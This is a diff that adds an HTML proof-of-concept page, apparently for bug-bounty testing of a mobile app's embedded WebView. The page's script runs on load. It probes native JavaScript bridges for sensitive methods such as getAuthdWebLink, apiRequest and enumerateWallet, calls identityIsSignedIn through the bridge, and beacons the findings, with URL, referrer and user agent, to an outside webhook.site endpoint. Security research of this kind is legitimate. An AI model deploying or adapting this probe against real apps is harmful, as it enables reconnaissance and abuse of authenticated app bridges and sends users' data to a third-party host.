@@ -1,0 +1,59 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>CK EWA bridge probe</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<style>body{font:14px/1.4 monospace;padding:14px;background:#111;color:#0f0}pre{white-space:pre-wrap}</style>
+</head><body>
+<h3>EWA bridge probe</h3><pre id="out">running…</pre>
+<script>
+const LOG = 'https://webhook.site/59fbcb64-bbcb-44b1-8aec-789a281681f3/';
+const out = document.getElementById('out');
+const R = {tag:'ck-ewa', url: location.href, origin: location.origin, ref: document.referrer,
+           ua: navigator.userAgent, t: Date.now(), bridges:{}, calls:{}};
+function send(obj){
+  const body = JSON.stringify(obj);
+  try { navigator.sendBeacon(LOG + 'probe', body); } catch(e){}
+  try { fetch(LOG + 'probe', {method:'POST', body, mode:'no-cors'}); } catch(e){}
+}
+function probe(name){
+  const r = {present:false, type:null, methods:[]};
+  try {
+    const o = window[name];
+    r.present = (typeof o !== 'undefined' && o !== null);
+    r.type = typeof o;
+    if (r.present) {
+      const cand = ['apiRequest','getAuthdWebLink','identityIsSignedIn','identityHydrateUrl',
+        'identitySignInHandlingChallenges','endAppTiming','copyToClipboard','deeplink','showPDF',
+        'httpHeaderRequest','darwinRequest','beginPlaidLink','configureWebView','enumerateWallet',
+        'primeDeviceData','hapticFeedback','transitionV2Enabled'];
+      for (const c of cand) { try { if (typeof o[c] === 'function') r.methods.push(c); } catch(e){} }
+    }
+  } catch(e) { r.error = String(e); }
+  return r;
+}
+['EmbeddedClient','Android','CKPreWarmBridge','CKPreWarmBridgeV2','webkit','ReactNativeWebView',
+ '__coachmarks','BreezeBridge'].forEach(n => R.bridges[n] = probe(n));
+
+// harmless capability trigger: read sign-in state through the native bridge
+try {
+  if (window.EmbeddedClient && typeof window.EmbeddedClient.identityIsSignedIn === 'function') {
+    window.EmbeddedClient.identityIsSignedIn(JSON.stringify({requestId:'poc-signedin-1', payload:{}}));
+    R.calls.identityIsSignedIn = 'called';
+  }
+} catch(e) { R.calls.identityIsSignedIn = 'error: '+e; }
+try {
+  if (window.EmbeddedClient && typeof window.EmbeddedClient.transitionV2Enabled === 'function') {
+    R.calls.transitionV2Enabled = String(window.EmbeddedClient.transitionV2Enabled());
+  }
+} catch(e) { R.calls.transitionV2Enabled = 'error: '+e; }
+try {
+  if (window.EmbeddedClient && typeof window.EmbeddedClient.httpHeaderRequestBridgeEnabled === 'function') {
+    R.calls.httpHeaderRequestBridgeEnabled = String(window.EmbeddedClient.httpHeaderRequestBridgeEnabled());
+  }
+} catch(e) { R.calls.httpHeaderRequestBridgeEnabled = 'error: '+e; }
+
+out.textContent = JSON.stringify(R, null, 1);
+send(R);
+// second beacon after 1.5s in case the first raced the WebView load
+setTimeout(()=>send({tag:'ck-ewa-late', url:location.href, bridges:Object.keys(R.bridges).filter(k=>R.bridges[k].present), calls:R.calls}), 1500);
+</script>
+</body></html>
